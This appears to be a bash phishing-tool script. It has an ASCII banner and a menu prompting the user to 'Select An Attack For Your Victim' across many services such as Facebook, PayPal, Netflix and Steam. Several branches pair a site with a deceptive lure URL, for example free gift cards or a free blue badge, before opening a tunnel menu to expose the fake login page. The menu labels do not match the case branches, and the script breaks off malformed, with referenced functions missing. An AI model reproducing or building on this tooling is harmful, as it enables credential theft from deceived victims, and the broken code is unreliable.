# = = = = = = = = = = =
#This Tool By Basel
#Dont Copy The Code ;;D
clear
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
printf "\n"
printf "\n"
printf "\n" 
echo '
██████╗  █████╗ ███████╗███████╗██╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝██║     
██████╔╝███████║███████╗█████╗  ██║     
██╔══██╗██╔══██║╚════██║██╔══╝  ██║     
██████╔╝██║  ██║███████║███████╗███████╗
╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                        
' |lolcat

main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
  ${RED}[${WHITE}01${RED}]${ORANGE} Show My Ip & Hostname ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt		${RED}[${WHITE}02${RED}]${ORANGE} My Ip Info     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
${RED}[${WHITE}03${RED}]${ORANGE} Ip Info        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
${RED}[${WHITE}04${RED}]${ORANGE} Instagram Attack${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
	${RED}[${WHITE}05${RED}]${ORANGE} User Checker   ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
	${RED}[${WHITE}06${RED}]${ORANGE} Facebook Attack    ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
	                                                   ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
                                                     ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
   }

